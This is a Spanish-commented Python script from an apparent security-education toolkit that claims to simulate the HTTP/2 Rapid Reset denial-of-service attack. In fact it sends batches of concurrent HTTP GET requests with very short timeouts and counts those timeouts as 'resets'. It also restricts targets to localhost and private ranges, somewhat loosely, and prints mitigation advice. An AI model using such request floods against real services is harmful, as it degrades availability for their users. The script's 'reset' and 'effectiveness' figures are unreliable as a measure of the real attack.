
#!/usr/bin/env python3
"""
HTTP/2 Rapid Reset DoS Simulator
Desarrollado por @descambiado para BOFA v2.3.0
EDUCATIVO: Simula ataque DoS HTTP/2 Rapid Reset (solo localhost/labs)
"""

import asyncio
import aiohttp
import argparse
import time
import sys
from urllib.parse import urlparse

class HTTP2RapidResetSimulator:
    def __init__(self, target_url, max_streams=100, duration=30, verbose=False):
        self.target_url = target_url
        self.max_streams = max_streams
        self.duration = duration
        self.verbose = verbose
        self.requests_sent = 0
        self.resets_sent = 0
        self.start_time = None
        
    def print_banner(self):
        print("""
╔══════════════════════════════════════════════════════════════════╗
║                HTTP/2 Rapid Reset DoS Simulator                 ║
║                    HERRAMIENTA EDUCATIVA                         ║
║                   Por @descambiado - BOFA                       ║
╚══════════════════════════════════════════════════════════════════╝
        """)
        
    def validate_target(self):
        """Valida que el objetivo sea localhost o un lab autorizado"""
        parsed = urlparse(self.target_url)
        hostname = parsed.hostname.lower()
        
        allowed_hosts = [
            'localhost',
            '127.0.0.1',
            '::1',
            'host.docker.internal'
        ]
        
        # Permitir IPs de red local para labs
        if hostname.startswith(('192.168.', '10.', '172.')):
            allowed_hosts.append(hostname)
            
        if hostname not in allowed_hosts and not hostname.endswith('.local'):
            print(f"❌ ERROR: Objetivo no autorizado: {hostname}")
            print("Solo se permiten: localhost, 127.0.0.1, IPs locales, dominios .local")
            return False
            
        return True
        
    async def send_rapid_reset_stream(self, session, stream_id):
        """Simula envío de stream con reset rápido"""
        try:
            # Crear request
            start_time = time.time()
            
            # En una implementación real, aquí se enviarían frames HTTP/2 específicos
            # Para la simulación, usamos requests HTTP/1.1 con timeout muy bajo
            timeout = aiohttp.ClientTimeout(total=0.1)
            
            async with session.get(self.target_url, timeout=timeout) as response:
                # Inmediatamente "reseteamos" la conexión cancelando
                pass
                
        except (asyncio.TimeoutError, aiohttp.ClientError):
            # Timeout/error esperado - simula el reset
            self.resets_sent += 1
            
        except Exception as e:
            if self.verbose:
                print(f"[DEBUG] Stream {stream_id} error: {e}")
                
        finally:
            self.requests_sent += 1
            
    async def run_simulation(self):
        """Ejecuta la simulación de rapid reset"""
        print(f"[INFO] Iniciando simulación contra {self.target_url}")
        print(f"[INFO] Streams máximos: {self.max_streams}")
        print(f"[INFO] Duración: {self.duration} segundos")
        print("⚠️  NOTA: Esto es una simulación educativa\n")
        
        self.start_time = time.time()
        
        # Configurar sesión HTTP/2 simulada
        connector = aiohttp.TCPConnector(limit=self.max_streams)
        timeout = aiohttp.ClientTimeout(total=1.0)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            while time.time() - self.start_time < self.duration:
                # Crear batch de streams concurrentes
                tasks = []
                
                for i in range(min(self.max_streams, 50)):  # Batch de 50
                    task = asyncio.create_task(
                        self.send_rapid_reset_stream(session, i)
                    )
                    tasks.append(task)
                    
                # Ejecutar batch
                await asyncio.gather(*tasks, return_exceptions=True)
                
                # Mostrar progreso
                elapsed = time.time() - self.start_time
                if self.verbose and int(elapsed) % 5 == 0:
                    rate = self.requests_sent / elapsed if elapsed > 0 else 0
                    print(f"[PROGRESS] Tiempo: {elapsed:.1f}s, Requests: {self.requests_sent}, Rate: {rate:.1f}/s")
                    
                # Pequeña pausa para evitar saturar completamente
                await asyncio.sleep(0.1)
                
    def generate_report(self):
        """Genera reporte de la simulación"""
        elapsed_time = time.time() - self.start_time
        
        print("\n" + "="*60)
        print("REPORTE DE SIMULACIÓN - HTTP/2 Rapid Reset DoS")
        print("="*60)
        
        print(f"\n📊 ESTADÍSTICAS:")
        print(f"Objetivo: {self.target_url}")
        print(f"Duración total: {elapsed_time:.2f} segundos")
        print(f"Requests enviados: {self.requests_sent}")
        print(f"Resets simulados: {self.resets_sent}")
        print(f"Rate promedio: {self.requests_sent / elapsed_time:.2f} requests/segundo")
        print(f"Streams máximos: {self.max_streams}")
        
        print(f"\n🎯 EFECTIVIDAD SIMULADA:")
        reset_ratio = (self.resets_sent / self.requests_sent * 100) if self.requests_sent > 0 else 0
        print(f"Ratio de resets: {reset_ratio:.1f}%")
        
        if reset_ratio > 80:
            effectiveness = "🔴 MUY EFECTIVO"
        elif reset_ratio > 50:
            effectiveness = "🟡 MODERADAMENTE EFECTIVO"
        else:
            effectiveness = "🟢 POCO EFECTIVO"
            
        print(f"Efectividad simulada: {effectiveness}")
        
        print(f"\n🛡️  MITIGACIONES RECOMENDADAS:")
        print("- Implementar límites de rate por cliente")
        print("- Configurar timeouts apropiados en HTTP/2")
        print("- Usar load balancers con protección DDoS")
        print("- Monitorear métricas de streams HTTP/2")
        print("- Actualizar servidores web a versiones patcheadas")
        
    async def run(self):
        """Ejecuta la simulación completa"""
        self.print_banner()
        
        print("⚠️  AVISO: Esta herramienta es solo para EDUCACIÓN y LABS")
        print("Solo usar contra localhost o entornos controlados\n")
        
        if not self.validate_target():
            return False
            
        try:
            await self.run_simulation()
            self.generate_report()
            return True
            
        except Exception as e:
            print(f"[ERROR] Error durante la simulación: {e}")
            return False

def main():
    parser = argparse.ArgumentParser(description="HTTP/2 Rapid Reset DoS Simulator")
    parser.add_argument("target", help="URL objetivo (solo localhost/labs)")
    parser.add_argument("-s", "--streams", type=int, default=100, help="Máximo streams concurrentes")
    parser.add_argument("-d", "--duration", type=int, default=30, help="Duración en segundos")
    parser.add_argument("-v", "--verbose", action="store_true", help="Modo verbose")
    
    args = parser.parse_args()
    
    # Validación básica
    if not args.target.startswith(('http://', 'https://')):
        print("[ERROR] La URL debe incluir el protocolo (http:// o https://)")
        sys.exit(1)
        
    if args.streams > 1000:
        print("[ERROR] Máximo de streams limitado a 1000 por seguridad")
        sys.exit(1)
        
    simulator = HTTP2RapidResetSimulator(
        args.target, 
        args.streams, 
        args.duration, 
        args.verbose
    )
    
    try:
        asyncio.run(simulator.run())
    except KeyboardInterrupt:
        print("\n[INFO] Simulación interrumpida por el usuario")
    except Exception as e:
        print(f"[ERROR] Error durante la ejecución: {e}")

if __name__ == "__main__":
    main()
